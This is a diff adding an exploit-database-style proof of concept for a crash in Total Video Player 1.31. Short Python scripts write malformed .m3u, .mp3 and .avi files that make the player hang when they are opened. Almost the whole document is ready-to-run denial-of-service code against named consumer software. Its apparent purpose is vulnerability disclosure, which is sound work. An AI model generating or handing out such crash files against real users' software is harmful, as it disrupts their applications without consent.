@@ -1,0 +1,33 @@
+# Exploit Title: Total Video Player 1.31 .m3u Crash Poc 
+# Date: June 17 2012  
+# Exploit Author: 0dem
+# Vendor Homepage: http://www.effectmatrix.com/
+# Software Link: http://download.cnet.com/Total-Video-Player/3000-2139_4-10552696.html
+# Version: V1.31
+# Tested on: Windows XP SP 3
+# Description:   Total Video Player has no correct input handling and will hang, 
+#   when trying to open malformed .m3u files. .mp3 and .avi files are affected too
+
+# --- m3u -----------------------------------------------
+#!/usr/bin/python
+junk = "#EXTM3U\n"
+junk += "#EXTINF:666, 0dem, 0dem\n"
+junk += "c:\\A"
+
+file = open("PoC.m3u","w")
+file.writelines(junk)
+file.close()
+
+# --- mp3 -----------------------------------------------
+#!/usr/bin/python
+junk = "\x41" * 100
+file = open("PoC.mp3","w")
+file.writelines(junk)
+file.close()
+
+# --- avi -----------------------------------------------
+#!/usr/bin/python
+junk = "\x41" * 100
+file = open("PoC.avi","w")
+file.writelines(junk)
+file.close()
